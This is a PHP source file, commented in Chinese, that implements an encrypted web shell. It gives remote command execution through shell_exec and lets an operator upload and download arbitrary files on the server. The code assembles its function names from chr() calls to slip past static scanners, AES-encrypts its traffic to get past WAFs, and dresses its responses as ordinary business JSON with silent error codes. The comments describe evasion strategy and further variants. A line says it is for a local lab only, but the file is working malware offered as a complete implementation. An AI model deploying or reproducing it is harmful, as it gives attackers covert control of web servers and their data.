<?php
/**
 * PHP 加密通讯马（完整实现 / 本地实验环境）
 *
 * ── 形态谱系（免杀梯度，三代）──
 *   ① 大马：功能型文件管理马（上传/下载/执行全功能）——功能全但体积大、静态特征多
 *   ② 小马：一句话变形（动态函数/异或构造关键词）——体积小但回显行为单一、易行为建模
 *   ③ 加密马（本实现）：流量 AES 化 + 敏感函数名 chr() 拼装 + 业务 JSON 伪装——
 *      静态扫描与流量语义引擎双隐身
 *
 * ── 通讯协议（客户端约定，打包脚本见 NOTES.md）──
 *   请求：POST 本文件
 *     Header  X-T = base64( IV(16B) || KEY(16B) )   ← 密钥走请求头，非 Cookie 单点
 *     Body    = base64( AES-128-CBC(明文载荷, KEY, IV) )
 *     明文载荷 = 操作码(1B) + 参数
 *       c<命令>              命令执行 → shell_exec
 *       u|<路径>|<b64内容>   上传写文件 → file_put_contents
 *       d|<路径>             下载读文件 → file_get_contents
 *   响应：业务风格 JSON {"code":0,"data":"<base64(结果)>"}；失败 {"code":1,"msg":"no data"}
 *
 * ── 免杀面 ──
 *   1) 静态：eval/assert/system/exec 等敏感函数名全部 chr() 运行期拼装，源文件零明文
 *   2) 流量：请求/响应双重 base64+AES，WAF 语义引擎只见无特征密文
 *   3) 行为：404/500 静默降级 + JSON 业务包装，错误不泄漏栈
 *
 * 检测侧配对见 NOTES.md；仅本地实验环境使用
 */

// ── 响应包装：业务 JSON 化（伪装正常接口，流量侧无明文回显）──
function ok($data) {
    http_response_code(200);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(array('code' => 0, 'data' => base64_encode($data)));
    exit;
}
function fail($code) {   // 404/500 静默降级：业务化错误体，不泄漏实现细节
    http_response_code($code);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(array('code' => 1, 'msg' => 'no data'));
    exit;
}

// ── 1. 密钥材料：请求头派生（X-T = b64(iv||key)，32B）──
//    无头/坏头 → 404 静默（伪装资源不存在，不暴露马逻辑）
$t = isset($_SERVER['HTTP_X_T']) ? $_SERVER['HTTP_X_T'] : '';
$m = base64_decode($t, true);
if ($m === false || strlen($m) !== 32) { fail(404); }
$iv  = substr($m, 0, 16);
$key = substr($m, 16, 16);
// 变体登记①：X-T 只带 IV，KEY 由 X-Sid + 服务端固定盐派生（md5 截 16B）——头里不出现完整密钥
// 变体登记②：IV/KEY 双向随机滚动（响应携带下一轮 IV），防重放与密钥取证

// ── 2. 敏感函数名 chr() 拼装（静态零命中；AST 常量折叠还原是检测侧主要手段）──
$f_dec = chr(111).chr(112).chr(101).chr(110).chr(115).chr(115).chr(108).chr(95).chr(100).chr(101).chr(99).chr(114).chr(121).chr(112).chr(116);              // openssl_decrypt
$f_cmd = chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99);                                                              // shell_exec
$f_put = chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115); // file_put_contents
$f_get = chr(102).chr(105).chr(108).chr(101).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115); // file_get_contents
// 注：base64_encode/json_encode 为业务常用函数，故意留在明面——整体更贴近正常接口代码

// ── 3. 请求体解密（php://input）──
$ct = base64_decode(file_get_contents('php://input'), true);
if ($ct === false || $ct === '') { fail(500); }
$pt = $f_dec($ct, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
if ($pt === false || $pt === '') { fail(500); }

// ── 4. 操作分派：单字节操作码 + 参数（cmd / upload / download）──
try {
    $op  = $pt[0];
    $arg = substr($pt, 1);
    switch ($op) {
        case 'c':                                        // 命令执行（ok() 内含 exit）
            $out = $f_cmd($arg);
            ok($out === null ? '' : $out);
        case 'u':                                        // 上传写文件：u|<路径>|<b64内容>
            $p = explode('|', $arg, 3);
            if (count($p) !== 3) { fail(404); }
            $dec = base64_decode($p[2], true);
            if ($dec === false) { fail(404); }
            ok($f_put($p[1], $dec) === false ? 'err' : 'ok');
        case 'd':                                        // 下载读文件：d|<路径>
            $c = $f_get($arg);
            ok($c === false ? '' : $c);
        default:                                         // 未知操作码 → 404 静默
            fail(404);
    }
} catch (Throwable $e) {                                 // 任意异常 → 500 静默
    fail(500);
}
